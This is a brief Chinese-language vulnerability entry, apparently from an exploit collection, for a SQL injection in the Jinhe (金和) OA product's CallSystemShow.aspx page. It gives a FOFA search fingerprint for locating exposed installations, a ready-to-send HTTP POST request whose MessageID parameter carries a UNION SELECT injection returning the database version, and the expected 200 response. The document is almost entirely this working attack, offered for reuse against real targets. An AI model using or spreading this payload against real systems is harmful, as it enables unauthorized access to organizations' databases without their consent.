# 金和C6CallSystemShow.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`

**Payload**
```
GPOST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
MessageID=%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION%2CNULL--
```
- **响应特征**：200